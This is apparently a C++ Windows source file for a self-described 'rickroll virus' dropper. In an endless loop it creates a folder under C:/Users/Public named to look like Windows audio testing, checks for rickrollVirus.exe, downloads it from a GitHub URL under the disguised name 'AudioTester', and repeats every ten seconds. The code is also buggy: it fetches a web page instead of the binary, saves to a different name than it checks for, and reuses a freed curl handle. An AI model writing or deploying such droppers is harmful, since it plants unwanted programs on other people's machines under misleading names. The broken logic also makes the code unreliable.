#include <iostream>
#include <windows.h>
#include <curl/curl.h>
#include <sys/stat.h>

using namespace std;

size_t writeData(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
    struct stat sb;
    CURL *curl;
    FILE *fp;
    CURLcode res;
    const char *rickrollVirusUrl = "https://github.com/TheCogster409/RickrollVirus/blob/main/rickrollVirus.exe";
    const char *rickrollVirusFileName = "AudioTester";

    curl = curl_easy_init();

    while (true){
        // Check and create virus folder
        const char* directory = "C:/Users/Public/WindowsAudioTesting";
        if (stat(directory, &sb) == 0) {
            cout << "Virus Folder exists! No need to create new!\n";
        } else {
            cout << "Creating new virus folder!\n";
            mkdir("C:/Users/Public/WindowsAudioTesting");
        }

        // Check and create rickrollVirus.exe
        directory = "C:/Users/Public/WindowsAudioTesting/rickrollVirus.exe";
        if (stat(directory, &sb) == 0) {
            cout << "Virus exists! No need to clone!\n";
        } else {
            cout << "Cloning virus!\n";
            if (curl){
                fp = fopen(rickrollVirusFileName, "wb");
                curl_easy_setopt(curl, CURLOPT_URL, rickrollVirusUrl);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeData);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
                res = curl_easy_perform(curl);
                curl_easy_cleanup(curl);
                fclose(fp);
                if (res == CURLE_OK) {
                    cout << "rickrollVirus.exe downloaded sucessfully!\n";
                } else {
                    cerr << "Error: Failed to download." << curl_easy_strerror(res) << endl;
                }
            }
        }

        Sleep(10000);
    }

    return 0;
}